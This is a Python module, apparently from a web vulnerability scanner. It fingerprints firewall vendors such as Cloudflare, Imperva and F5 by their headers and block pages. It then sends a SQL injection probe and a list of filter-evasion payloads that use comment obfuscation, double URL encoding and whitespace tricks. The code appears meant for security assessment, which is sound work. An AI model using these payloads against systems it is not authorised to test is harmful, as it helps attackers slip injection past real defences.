from modules.base import BaseModule


class WafModule(BaseModule):
    NAME = "waf"
    DESCRIPTION = "WAF detection and bypass evasion techniques"

    HEADER_SIGNATURES = {
        "Cloudflare": ["cf-ray", "cf-cache-status", "server: cloudflare", "__cf_bm"],
        "AWS WAF": ["x-amzn-waf-action", "x-amzn-waf-rule"],
        "ModSecurity": ["x-mod-security", "mod_security"],
        "Akamai": ["akamai-grn", "x-akamai-"],
        "Imperva": ["x-iinfo", "incap_ses", "visid_incap"],
        "Sucuri": ["x-sucuri-id", "x-sucuri-block"],
        "F5 BIG-IP": ["bigipserver", "server: big-ip", "x-wa-info"],
    }
    BODY_SIGNATURES = {
        "Cloudflare": ["attention required! | cloudflare", "cloudflare ray id:"],
        "AWS WAF": ["request blocked by aws waf"],
        "ModSecurity": ["modsecurity action", "mod_security action"],
        "Akamai": ["reference&#32;#", "akamai error reference"],
        "Imperva": ["incapsula incident id", "powered by imperva"],
        "Sucuri": ["sucuri website firewall - access denied"],
        "F5 BIG-IP": ["the requested url was rejected. please consult with your administrator"],
    }

    EVASION_PAYLOADS = [
        "1 aNd 1=1",
        "1/**/AND/**/1=1",
        "1 /*!AND*/ 1=1",
        "1%2520AND%25201=1",
        "1%09AND%091=1",
        "1%0aAND%0a1=1",
        "1 && 1=1",
        "1 || 1=1",
    ]

    def run(self):
        self.log.info("[waf] Detecting WAF presence and testing evasions")
        baseline = self.get(self.target, params={"id": "vulxor_waf_baseline"})
        attack = self.get(self.target, params={"id": "1' OR '1'='1"})
        waf_name = self._detect_waf(baseline, attack)
        if waf_name and self._is_blocked(attack) and not self._is_blocked(baseline):
            self._test_evasion()

    def _detect_waf(self, baseline, resp):
        if resp is None:
            return None
        waf_name = self._vendor(resp) or self._vendor(baseline)

        if waf_name:
            self.add_finding(
                severity="INFO",
                title=f"WAF detected: {waf_name}",
                url=self.target,
                detail=f"A vendor-specific header, cookie, or block-page signature matched {waf_name}.",
                remediation="Note for manual evasion testing.",
            )
            self.results.meta["waf"] = waf_name
            return waf_name

        if self._is_blocked(resp) and baseline is not None and not self._is_blocked(baseline):
            waf_name = "unknown"
            self.add_finding(
                severity="INFO",
                title="WAF or security filter detected (unknown vendor)",
                url=self.target,
                detail=f"Probe returned HTTP {resp.status_code}.",
            )
        else:
            self.add_finding(
                severity="INFO",
                title="No WAF detected",
                url=self.target,
                detail="Malformed SQL probe was not blocked.",
            )
        return waf_name

    def _vendor(self, resp):
        if resp is None:
            return None
        headers = "\n".join(f"{key}: {value}" for key, value in resp.headers.items()).casefold()
        body = resp.text[:20000].casefold()
        for waf_name, signatures in self.HEADER_SIGNATURES.items():
            if any(signature in headers for signature in signatures):
                return waf_name
        for waf_name, signatures in self.BODY_SIGNATURES.items():
            if any(signature in body for signature in signatures):
                return waf_name
        return None

    def _is_blocked(self, resp):
        return resp is not None and resp.status_code in (403, 406, 429, 501)

    def _test_evasion(self):
        for payload in self.EVASION_PAYLOADS:
            resp = self.get(self.target, params={"id": payload})
            if resp is not None and not self._is_blocked(resp) and 200 <= resp.status_code < 400:
                self.add_finding(
                    severity="MEDIUM",
                    title="WAF evasion successful",
                    url=self.target,
                    detail=f"Payload not blocked: '{payload}'.",
                    payload=payload,
                    remediation="Tune WAF rules to catch obfuscated injection patterns.",
                )
                return
